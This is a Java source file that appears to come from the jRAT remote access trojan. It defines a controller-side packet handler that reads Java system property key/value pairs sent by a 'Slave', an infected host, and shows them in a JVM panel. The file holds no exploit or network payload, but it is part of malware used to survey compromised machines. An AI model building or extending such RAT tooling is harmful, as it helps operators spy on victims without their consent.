package jrat.module.system.packets;

import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPacket;
import jrat.module.system.ui.PanelJVM;


public class Packet44SystemJavaProperty implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String key = slave.readLine();
		String value = slave.readLine();

        PanelJVM panel = (PanelJVM) slave.getPanel(PanelJVM.class);
		if (panel != null) {
			panel.getModel().addRow(new Object[] { key, value });
		}
	}

}
